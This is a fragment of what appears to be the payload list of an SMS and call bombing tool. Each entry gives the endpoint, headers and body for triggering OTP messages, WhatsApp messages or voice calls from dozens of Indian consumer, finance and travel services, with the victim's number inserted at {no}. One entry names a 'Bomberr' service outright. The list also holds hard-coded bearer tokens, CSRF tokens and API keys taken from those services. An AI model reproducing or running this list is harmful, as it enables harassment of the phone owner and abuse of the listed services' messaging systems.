        {"name":"Moglix_V2","url":"https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2","method":"POST","headers":{"Content-Type":"application/json","x-platform":"PWA"},"body":{"email":"","phone":"{no}","type":"p","source":"signup"}},
        {"name":"TrulyMadly","url":"https://app.trulymadly.com/api/auth/mobile/v1/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","locale":"IN"}},
        {"name":"Apna","url":"https://production.apna.co/api/userprofile/v1/otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","hash_type":"play_store"}},
        {"name":"Apna_v2","url":"https://production.apna.co/api/userprofile/v1/otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone_number":"91{no}","retries":0,"hash_type":"employer","source":"employer"}},
        {"name":"Swipe","url":"https://app.getswipe.in/api/user/mobile_login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","resend":True}},
        {"name":"Country_Delight","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","platform":"Android","mode":"new_user"}},
        {"name":"Rapido_SMS","url":"https://customer.rapido.bike/api/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Rapido_GenerateOTP","url":"https://customer.rapido.bike/api/customer/v2/generateOtp","method":"POST","headers":{"Content-Type":"application/json","aid":"g4dv8FPtw4P87hPSEncuIH4gtlj4Ei2l+O0LSGvIr0M="},"body":{"deviceDetails":{"appId":"2","deviceId":"13d0b5bd46e271ca","manufacturer":"google","model":"Pixel 4"},"mobile":"{no}"}},
        {"name":"BetterHalf","url":"https://api.betterhalf.ai/v2/auth/otp/send/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isd_code":"91"}},
        {"name":"Nuvama_Wealth","url":"https://nma.nuvamawealth.com/edelmw-content/content/otp/register","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileNo":"{no}","emailID":"test@example.com"}},
        {"name":"Mpokket","url":"https://web-api.mpokket.in/registration/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Mpokket_Signup","url":"https://web-api.mpokket.in/registration/sendOtp/sign-up","method":"POST","headers":{"Content-Type":"application/json","Authorization":"Bearer"},"body":{"payload":"U2FsdGVkX1/eb9kMqF3HgTIL63xwEgDkzfVoASZufOdHHizpf9UKLyTQY9wB2QeR"}},
        {"name":"More_Retail","url":"https://omni-api.moreretail.in/api/v1/login/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","hash_key":"XfsoCeXADQA"}},
        {"name":"Charzer","url":"https://api.charzer.com/auth-service/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","appSource":"CHARZER_APP"}},
        {"name":"BikeFixup","url":"https://api.bikefixup.com/api/v2/send-registration-otp","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","client":"app"},"body":{"phone":"{no}","app_signature":"4pFtQJwcz6y"}},
        {"name":"Foxy_SMS","url":"https://www.foxy.in/api/v2/users/send_otp","method":"POST","headers":{"Content-Type":"application/json","Platform":"web"},"body":{"user":{"phone_number":"+91{no}"},"via":"sms"}},
        {"name":"Licious","url":"https://www.licious.in/api/login/signup","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","captcha_token":None}},
        {"name":"CureFoods","url":"https://web.curefoods.com/api/v2/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","country_code":"+91"}},
        {"name":"Puma","url":"https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"dwfrm_phone={no}&format=ajax"},
        {"name":"Decathlon","url":"https://www.decathlon.in/api/v1/auth/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isLogin":True}},
        {"name":"McDonalds","url":"https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{no}","source":"web"}},
        {"name":"Dominos","url":"https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","source":"WEB"}},
        {"name":"Zivame","url":"https://www.zivame.com/auth/public/v1/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","countryCode":"IN"}},
        {"name":"FirstCry","url":"https://www.firstcry.com/api/v2/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Tata1mg","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json"},"body":{"number":"{no}","login_with":"mobile"}},
        {"name":"Tata1mg_PWA","url":"https://www.1mg.com/pwa-api/auth/create_token","method":"POST","headers":{"Content-Type":"application/json","HKP-Platform":"Healthkartplus-0.0.1-mobileweb","X-Access-Key":"1mg_client_access_key","X-1mgLabs-Platform":"mWeb"},"body":{"referral_code":None,"number":"{no}"}},
        {"name":"1mg_SMS","url":"https://www.1mg.com/pwa-api/auth/create_token","method":"POST","headers":{"Content-Type":"application/json","HKP-Platform":"Healthkartplus-0.0.1-mobileweb"},"body":{"referral_code":None,"number":"{no}"}},
        {"name":"Upstox","url":"https://api.upstox.com/v2/login/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","client_id":"UPSTOX"}},
        {"name":"Zerodha","url":"https://kite.zerodha.com/api/login","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"user_id={no}"},
        {"name":"Groww","url":"https://groww.in/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","platform":"WEB"}},
        {"name":"DittoTV","url":"https://www.dittotv.in/auth/sendOTP/v1","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileno":"{no}","sendOTP":True}},
        {"name":"SonyLiv_SMS","url":"https://www.sonyliv.com/api/v1/auth/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","countryCode":"+91"}},
        {"name":"BookMyShow","url":"https://in.bmscdn.com/mjson/User/SendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileNo":"{no}"}},
        {"name":"BookMyShow_v2","url":"https://in.bookmyshow.com/auth/send/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Furlenco","url":"https://www.furlenco.com/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","term":"true"}},
        {"name":"CityFurnish","url":"https://www.cityfurnish.com/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Ixigo_Alt","url":"https://www.ixigo.com/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","countryCode":"+91"}},
        {"name":"EaseMyTrip","url":"https://www.easemytrip.com/api/otp/SendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"Mobileno":"{no}","Type":"M"}},
        {"name":"Goibibo","url":"https://www.goibibo.com/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","countryCode":"+91"}},
        {"name":"RedBus_SMS","url":"https://www.redbus.in/api/getOtpV2","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneCode":"91","mobile":"{no}","whatsappOption":False,"reCaptchaResponse":"dummy"}},
        {"name":"Rapido_SMS2","url":"https://rapido.bike/api/v1/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","source":"SMS"}},
        {"name":"Oziva_SMS","url":"https://api.prod.oziva.in/nitro/send/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","source":"order_management","type":"sms","consentForAddressUse":False}},
        {"name":"Astroyogi_Comm_SMS","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","method":"POST","headers":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.","Accept-Language":"en-US","Accept":"application/json","Content-Type":"application/json"},"body":{"phoneCode":"91","countryCode":"IN","mobileNumber":"{no}","platform":"Web","IpAddress":"117.234.73.154","requestType":"sms","countryCodeByHeader":"IN"}},
        {"name":"AstroYogi_WhatsApp","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","method":"POST","headers":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.","Accept-Language":"en-US","Content-Type":"application/json"},"body":{"phoneCode":"91","countryCode":"IN","mobileNumber":"{no}","platform":"Web","IpAddress":"117.234.73.154","requestType":"whatsapp","countryCodeByHeader":"IN"}},
        {"name":"AstroYogi_Call","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","method":"POST","headers":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.","Accept-Language":"en-US","Content-Type":"application/json","Referer":"https://www.astroyogi.com/registration/login.aspx"},"body":{"phoneCode":"91","countryCode":"IN","mobileNumber":"{no}","platform":"Web","IpAddress":"117.234.73.154","requestType":"call","countryCodeByHeader":"IN"}},
        {"name":"AstroYogi_SMS","url":"https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3","method":"POST","headers":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.","Accept-Language":"en-US","Content-Type":"application/json"},"body":{"PhoneNumber":"{no}","PhoneCode":"91","Domain":"Web","CountryId":"IN","IpAddress":"117.234.73.154","CountryCodeByHeader":"IN"}},
        {"name":"AnytimeAstro","url":"https://www.anytimeastro.com/account/registermobile/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"},"body":{"ContactMobile":"{no}","MobCode":"%2B91","AcceptHuman":"true","CountryCode":"in","AcceptHumanenabled":"1","captchaenabled":"0"}},
        {"name":"Apollo247","url":"https://apigateway.apollo247.in/auth-service/generateOtp","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json;charset=utf-8","x-app-os":"web","x-app-device-id":"Desktop"},"body":{"loginType":"PATIENT","mobileNumber":"+{no}"}},
        {"name":"BharatMatrimony","url":"https://greg.bharatmatrimony.com/","method":"POST","headers":{"apptype":"115","sessionvalue":"01KV2GDFBZK0718YFRG5WCHTDG","Accept":"application/json","Content-Type":"application/json"},"body":{"operationName":"SendRegistrationOTP","variables":{"input":{"motherTongue":"TAMIL","registerId":119702837,"registrationToken":"5a88de4e6473364a9d4f8dc32f5bb2af~IfJLlQLb3bw6Tr/PCXKXpyraj3wu8hJ7cDLLhUCkCQs=","device":{},"deviceToken":"WEB"}},"query":"mutation SendRegistrationOTP($input: RegisterId) { sendRegistrationOTP(input: $input) { sessionValue status __typename } }"}},
        {"name":"Jeevansathi","url":"https://www.jeevansathi.com/app-gateway/auth/v1/phone/otp","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","JS-User-Agent":"JSMS"},"body":{"userId":"{no}","isd":"91","otpType":"LOGIN_PROFILE"}},
        {"name":"Yatra","url":"https://www.yatra.com/social/common/yatra/sendMobileOTP","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"body":{"isdCode":"91","mobileNumber":"{no}"}},
        {"name":"Cleartrip","url":"https://www.cleartrip.com/accounts/external-api/otp","method":"POST","headers":{"channel":"PWA","x_ct_sourcetype":"MOBILE","Content-Type":"application/json","ab-otp":"b"},"body":{"value":"{no}","type":"MOBILE","action":"SIGNIN","countryCode":"+91"}},
        {"name":"Swiggy_SMS","url":"https://www.swiggy.com/mapi/auth/sms-otp","method":"POST","headers":{"Content-Type":"application/json","platform":"mweb"},"body":{"mobile":"{no}","_csrf":"3eux3tggHIFM-af_1Dssqu1f6xuveWY1yqrm0ggI"}},
        {"name":"KPNFresh_SMS","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate","method":"POST","params":{"channel":"WEB","version":"1.0.0"},"headers":{"x-app-id":"82f2bcd2-b3cf-4c2a-bc8f-29acc2068c4d","x-channel-id":"WEB","Content-Type":"application/json"},"body":{"phone_number":{"number":"{no}","country_code":"+91"}}},
        {"name":"Savana_SMS","url":"https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json;charset=utf-8","x-source":"h5","x-platform":"web","h5-version":"5.6.0","country-language":"en-IN","client_type":"h5","app_version":"5.6.0"},"body":{"userName":"{no}","type":0,"channel":1,"bizTraceId":"93d67a64fa6b4ca4bee136f9a2470d97","phonePrefix":"+91"}},
        {"name":"Ixigo_SMS","url":"https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","apiKey":"iximweb!2$","ixiSrc":"iximweb","clientId":"iximweb","deviceId":"fa1deb39ff4f441796e0","uuid":"fa1deb39ff4f441796e0"},"body":"token=0239bfc7bb3df5dc4bfb0553a58ae8d900c13e2e3a297c6cddcff5ebfc44b44e62d5f7051b24d93a0935f1911aabff78fd3a15b15d71ec9ed7539a331d295a4f&sixDigitOTP=true&prefix=%2B91&phone={no}&resendOnCall=false"},
        {"name":"Hotstar_SMS","url":"https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8","method":"POST","params":{"action":"resendOtp"},"headers":{"Accept":"application/json","Content-Type":"application/json","x-hs-retry-count":"0","X-HS-Platform":"mweb","X-Country-Code":"in","accept-language":"eng"},"body":{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","phone_number":"{no}","initiate_by":0,"recaptcha_token":"","source":0}}},
        {"name":"HappiMobiles","url":"https://dev-services.happimobiles.com/api/user-login/homepage","method":"POST","headers":{"Content-Type":"application/json"},"body":{}},
        {"name":"VisitApp_SMS","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json"},"body":{"phone":"{no}","countryCode":91,"platform":"WEB","ssoInfo":None,"storedUTMParams":{},"emailCode":"","evId":""}},
        {"name":"VisitApp_WhatsApp","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json"},"body":{"channel":"whatsapp","resend":True,"countryCode":91,"phone":"{no}","platform":"WEB"}},
        {"name":"VRLBus","url":"https://www.vrlbus.in/Web_Methods/OtherWebMethod.aspx/GenrateOTP","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json;charset=UTF-8"},"body":{"PhoneNo":"{no}","Captcha":"6yg78"}},
        {"name":"KreditBee","url":"https://api.kreditbee.in/v1/me/otp","method":"PUT","headers":{"authorization":"Bearer null","Content-Type":"application/json"},"body":{"reason":"loginOrRegister","mobile":"{no}","appsflyerId":"dummy","mediaSource":""}},
        {"name":"Dehaat","url":"https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json"},"body":{"mobile_number":"{no}","client_id":"kisan-app"}},
        {"name":"Medkart","url":"https://app.medkart.in/api/v2/auth/request-otp","method":"POST","params":{"identifier":"9b7e16ca6422f"},"headers":{"authorization":"Bearer","lang":"en","Content-Type":"application/json"},"body":{"mobile_no":"{no}"}},
        {"name":"RailYatri","url":"https://www.railyatri.in/m/user-web-point","method":"GET","params":{"phone_number":"{no}","_":"1780590041610"},"headers":{"x-requested-with":"XMLHttpRequest"},"body":{}},
        {"name":"HealthKart","url":"https://www.healthkart.com/veronica/user/login/send/otp/1/{no}","method":"GET","params":{"trkSrc":"HM-LPOPUP","forgotPassword":"false","plt":"2","st":"1"},"headers":{"plt":"2","pageuri":"/","st":"1","device":"47ee60e1bcc9f80"},"body":{}},
        {"name":"Zepto","url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","platform":"WEB","auth_revamp_flow":"v2","tenant":"ZEPTO","source":"DIRECT"},"body":{"mobileNumber":"{no}","countryCode":"+91"}},
        {"name":"Agoda_SMS","url":"https://www.agoda.com/ul/api/v1/auth","method":"POST","headers":{"ul-fallback-origin":"https://www.agoda.com","ul-app-id":"mspa","Content-Type":"application/json; charset=utf-8"},"body":{"email":"","keepMeSignedIn":False,"whatsapp":""}},
        {"name":"SmartCoin","url":"https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request","method":"POST","headers":{"Content-Type":"application/json","user_platform":"WEBFLOW","platform_code":"olyv","origin":"https://app.olyv.co.in"},"body":{"phone_number":"{no}","app_version":"100101","channel":"IVR","request_type":"REGISTRATION","onboarding_consent":True}},
        {"name":"KreditBee_Voice","url":"https://api.kreditbee.in/v1/me/otp","method":"PUT","headers":{"authorization":"Bearer null","Content-Type":"application/json"},"body":{"reason":"loginOrRegister","mobile":"{no}"}},
        {"name":"TataCapital_Voice","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/3.9.1"},"body":{"phone":"{no}","applSource":"","isOtpViaCallAtLogin":"true"}},
        {"name":"TataCapital_HL","url":"https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.tatacapital.com"},"body":{"mobileNumber":"{no}","isNew":1,"deviceOs":"web","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}},
        {"name":"TataCapital_PL","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.tatacapital.com"},"body":{"mobileNumber":"{no}","deviceOS":"Web","applSource":"PL","deviceType":"Web","deviceSubType":""}},
        {"name":"TataCapital_LAP","url":"https://onlinelaploans.tatacapital.com/APILayer/dlp/otp/services/generateOtp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.tatacapital.com"},"body":{"mobileNumber":"{no}","isNew":1,"deviceOs":"web","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}},
        {"name":"Unacademy_v3","url":"https://unacademy.com/api/v3/user/user_check/","method":"POST","params":{"enable-email":"true"},"headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/3.9.1"},"body":{"country_code":"IN","phone":"{no}","is_un_teach_user":False,"otp_type":2.0,"send_otp":True,"email":""}},
        {"name":"ShopClues","url":"https://www.shopclues.com/ajax/send_login_otp.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"},"body":"mobile={no}"},
        {"name":"Indiamart","url":"https://m.indiamart.com/mobile/api/register_mobile.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"mobile_no={no}&action=send_otp"},
        {"name":"Justdial","url":"https://www.justdial.com/functions/otp/send_otp.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"mobile={no}&type=login"},
        {"name":"PolicyBazaar","url":"https://www.policybazaar.com/api/user/generate_otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"PaisaBazaar","url":"https://www.paisabazaar.com/api/user/send-otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile_number":"{no}"}},
        {"name":"IndiaLends","url":"https://indialends.com/pl/SP_MVResend","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"https://indialends.com/personal-loan"},"body":"MobileNumber={no}&Mode=2"},
        {"name":"IndiaLends_OTP","url":"https://indialends.com/internal/a/mobile-verification_v2.ashx","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Referer":"https://indialends.com/personal-loan"},"body":"aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={no}&lj80gertdfg=0"},
        {"name":"MagicPin_Call","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","method":"POST","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","origin":"https://magicpin.in"},"body":{"phoneNumber":"91{no}","authMethod":"call","token":"dummy_token"}},
        {"name":"MagicPin_WhatsApp","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","method":"POST","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","origin":"https://magicpin.in"},"body":{"phoneNumber":"91{no}","authMethod":"whatsapp","token":"dummy_token"}},
        {"name":"Udaan_SMS","url":"https://auth.udaan.com/api/otp/send","method":"POST","params":{"client_id":"udaan-v2","whatsappConsent":"true"},"headers":{"x-app-id":"udaan-auth","content-type":"application/x-www-form-urlencoded;charset=UTF-8"},"body":"mobile={no}"},
        {"name":"Quikr","url":"https://www.quikr.com/core/register","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Myntra","url":"https://www.myntra.com/gateway/v1/auth/getotp","method":"POST","headers":{"Content-Type":"application/json","deviceId":"739ea08d-4757-4531-877d-f542e23870ed"},"body":{"phoneNumber":"{no}","signup":"ONECLICK"}},
        {"name":"MakeMyTrip_SMS","url":"https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP","method":"POST","params":{"region":"in","language":"eng","currency":"inr"},"headers":{"Content-Type":"application/json","vid":"d8a3a42f-1852-4ec7-aa6b-d715268e93b0","deviceid":"d8a3a42f-1852-4ec7-aa6b-d715268e93b0","Authorization":"h4nhc9jcgpAGIjp"},"body":{"loginId":"{no}","type":6,"isEncoded":False,"channel":["MOBILE"],"transactionId":False,"appHashKey":"@www.makemytrip.com #","countryCode":"91"}},
        {"name":"MakeMyTrip_WhatsApp","url":"https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP","method":"POST","params":{"region":"in","language":"eng","currency":"inr"},"headers":{"Content-Type":"application/json","Authorization":"h4nhc9jcgpAGIjp"},"body":{"loginId":"{no}","type":6,"isEncoded":False,"channel":["MOBILE","WHATSAPP"],"transactionId":False,"appHashKey":"@www.makemytrip.com #","countryCode":"91"}},
        {"name":"Jio","url":"https://www.jio.com/api/jio-login-service/login/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileNumber":"{no}","loginFlowType":"MOBILE","alternateNumber":""}},
        {"name":"Droom","url":"https://api.droom.in/v2/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"CarDekho","url":"https://api.cardekho.com/v1/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Gaadi","url":"https://api.gaadi.com/v1/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"BikeDekho","url":"https://api.bikedekho.com/v1/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"OLX_SMS","url":"https://www.olx.in/api/auth/authenticate","method":"POST","params":{"lang":"en-IN"},"headers":{"Content-Type":"application/json","Accept":"*/*","User-Agent":"okhttp/3.9.1"},"body":{"method":"sms","phone":"{no}","language":"en-IN","grantType":"retry"}},
        {"name":"OLX_Call","url":"https://www.olx.in/api/auth/authenticate","method":"POST","params":{"lang":"en-IN"},"headers":{"Content-Type":"application/json","Accept":"*/*","User-Agent":"okhttp/3.9.1"},"body":{"method":"call","phone":"{no}","language":"en-IN","grantType":"retry"}},
        {"name":"Codfirm_SMS","url":"https://api.codfirm.in/api/customers/login/otp/send","method":"POST","headers":{"Content-Type":"application/json","x-csrf-token":"Nr4fdJeJ-z4DMF6m8jeyEiGefgba7D3Ked38"},"body":{"medium":"sms","storeUrl":"clinikally.myshopify.com","phone":"{no}"}},
        {"name":"Codfirm_WhatsApp","url":"https://api.codfirm.in/api/customers/login/otp/send","method":"POST","headers":{"Content-Type":"application/json","x-csrf-token":"Nr4fdJeJ-z4DMF6m8jeyEiGefgba7D3Ked38"},"body":{"medium":"whatsapp","storeUrl":"clinikally.myshopify.com","phone":"{no}","resendOtp":True}},
        {"name":"Codfirm2","url":"https://api.codfirm.in/api/customers/login/otp/send","method":"POST","headers":{"Content-Type":"application/json","x-csrf-token":"bXk9WldL-j4gsD033RFgKkp1R7vsCBqaf6XI"},"body":{"medium":"sms","storeUrl":"clinikally.myshopify.com","phone":"{no}"}},
        {"name":"RegistaniaChar","url":"https://admin.registaniachar.com/api/whatsapp/send-otp","method":"POST","headers":{"Content-Type":"application/json","X-Signature":"6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},"body":{"phone":"{no}"}},
        {"name":"JioSaavn","url":"https://api1.jiosaavn.com/jio/sendOtp","method":"POST","params":{"__call":"jio/sendOtp","api_version":"4","_format":"json","_marker":"0","ctx":"wap6dot0"},"headers":{"Content-Type":"application/json","origin":"https://www.jiosaavn.com"},"body":{"phone_number":"+91{no}"}},
        {"name":"Sephora","url":"https://sephora.in/api/service/application/user/authentication/v1.0/login/otp","method":"POST","params":{"platform":"6523fa5f41f4eb4c10a1d869"},"headers":{"Content-Type":"application/json","authorization":"Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==","origin":"https://sephora.in"},"body":{"mobile":"{no}","country_code":"91"}},
        {"name":"FreeCharge","url":"https://www.freecharge.in/api/ims/rest/otp/resend","method":"POST","headers":{"Content-Type":"application/json","fcChannel":"12"},"body":{"otpId":"12345","otpThroughCall":False,"platformType":"WEB"}},
        {"name":"Snapdeal","url":"https://www.snapdeal.com/authenticate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Snapdeal_Call","url":"https://www.snapdeal.com/authenticate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","voice":True}},
        {"name":"Meesho","url":"https://api.meesho.com/v2/auth/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Meesho_OTP","url":"https://www.meesho.com/api/v1/user/login/request-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone_number":"{no}"}},
        {"name":"Croma","url":"https://api.croma.com/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"BigBasket","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile_number":"{no}"}},
        {"name":"Paytm","url":"https://accounts.paytm.com/signin/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","loginData":"LOGIN_USING_PHONE"}},
        {"name":"Paytm_OTP","url":"https://commonfront.paytm.com/v4/api/sendsms","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","guid":"2952fa812660c58dc160ca6c9894221d"}},
        {"name":"PhonePe","url":"https://www.phonepe.com/api/v2/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"OYO","url":"https://api.oyoroomscrm.com/api/v2/user/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Oyo_SMS","url":"https://www.oyorooms.com/api/pwa/generateotp?locale=en","method":"POST","headers":{"Content-Type":"text/plain;charset=UTF-8"},"body":{"phone":"{no}","country_code":"+91","nod":4}},
        {"name":"Uber","url":"https://auth.uber.com/v2/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Servetel","url":"https://api.servetel.in/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"mobile_number={no}"},
        {"name":"Servetel_SMS","url":"https://api.servetel.in/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","User-Agent":"okhttp/4.9.0"},"body":"mobile_number={no}"},
        {"name":"Bomberr","url":"https://bomberr.onrender.com/num={no}","method":"GET","headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"PaisaOnSalary","url":"https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegistration","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}},
